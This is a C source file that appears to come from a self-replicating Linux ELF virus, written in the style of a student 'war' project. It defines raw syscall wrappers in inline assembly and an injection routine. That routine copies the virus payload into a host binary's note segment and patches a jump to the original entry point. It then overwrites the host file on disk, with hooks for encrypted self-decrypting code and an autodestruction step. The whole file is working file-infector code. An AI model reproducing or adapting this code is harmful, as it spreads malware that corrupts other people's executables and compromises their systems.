#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE 
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void *_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)
{
	void *ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov rsi, %1\n"
		"mov edx, %2\n"
		"mov r10d, %3\n"
		"mov r8d, %4\n"
		"mov r9, %5\n"

		"mov rax, 0x9\n"
		"syscall\n"
		:
		: "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(fd), "g"(offset)
	);
	asm volatile
	(
		"mov %0, rax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _open(const char *filename, int flags, mode_t mode)
{
	int ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov esi, %1\n"
		"mov edx, %2\n"

		"mov rax, 0x2\n"
		"syscall\n"
		:
		: "g"(filename), "g"(flags), "g"(mode)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline ssize_t _write(int fd, const void *buf, size_t count)
{
	ssize_t ret;

	asm volatile
	(
		"mov edi, %0\n"
		"mov rsi, %1\n"
		"mov rdx, %2\n"

		"mov rax, 0x1\n"
		"syscall\n"
		:
		: "g"(fd), "g"(buf), "g"(count)
	);
	asm volatile
	(
		"mov %0, rax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _close(int fd)
{
	int ret;

	asm volatile
	(
		"mov edi, %0\n"

		"mov rax, 0x3\n"
		"syscall\n"
		:
		: "g"(fd)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _munmap(void *addr, size_t length)
{
	int ret = 0;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov rsi, %1\n"

		"mov rax, 0xb\n"
		"syscall\n"
		:
		: "g"(addr), "g"(length)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline size_t _strlen(const char *str)
{
	size_t ret = 0;

	if (str == NULL)
		return 0;

	while (str[ret])
		ret++;

	return ret;
}

__attribute__((always_inline)) static inline void _memcpy(void *dst, void const *src, const size_t size)
{
	if (dst == NULL)
		return ;
	if (src == NULL)
		return ;

	char *dst_tmp = dst;
	char const *src_tmp = src;

	for (size_t index = 0; index < size; index++)
		dst_tmp[index] = src_tmp[index];
}

__attribute__((always_inline)) static inline void write_on_memory(const struct s_host *host, char *ptr)
{
	char *dst = ptr;
	char *src = (char *)host->header;

	const size_t payload_size = PAYLOAD_SIZE + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));

	for (register size_t index = 0; index < host->note->data->p_offset + host->note->data->p_filesz; index++)
		*dst++ = *src++;

	for (register size_t index = 0; index < payload_size; index++)
		*dst++ = '*';
}

__attribute__((always_inline)) static inline void replicate_on_memory(const struct s_host *host, char *ptr)
{
	char jmp[] = {0xe9, 0x0, 0x0, 0x0, 0x0};
	const Elf64_Addr entry_point = host->old_entry - host->new_entry - (PAYLOAD_SIZE - 375);

	_memcpy(ptr + host->note->self->p_offset, __entry, PAYLOAD_SIZE);
	_memcpy(jmp + 1, &entry_point, sizeof(int));
	_memcpy(ptr + host->note->self->p_offset + (PAYLOAD_SIZE - 380), jmp, sizeof(jmp));
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

#if DEBUG
	char function[] = "injection:\t\t";
	char name[] = "/tmp/trace";
	int trace = _open(name, O_RDWR | O_APPEND, 0000);
	char newline = 0xa;
	char result = context + 48;
	
	if (trace > 0)
	{
		_write(trace, function, _strlen(function));
		_write(trace, &result, 1);
		_write(trace, &newline, 1);
	}

	_close(trace);
#endif

	if (context == FAILURE)
		goto label;

	char *ptr;
	int fd = 0;

	const size_t filesize = host->note->self->p_offset + host->note->self->p_filesz;

	if ((ptr = _mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	{
		context = FAILURE;
		goto label;
	}


	write_on_memory(host, ptr);
	replicate_on_memory(host, ptr);
//	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);

	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
	{
		context = FAILURE;
		goto label;
	}

	_write(fd, ptr, filesize);
	_close(fd);
	_munmap(ptr, filesize);
	_munmap(host->header, host->filesize);

label:
	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);

	autodestruction(host, keychain, context);
}
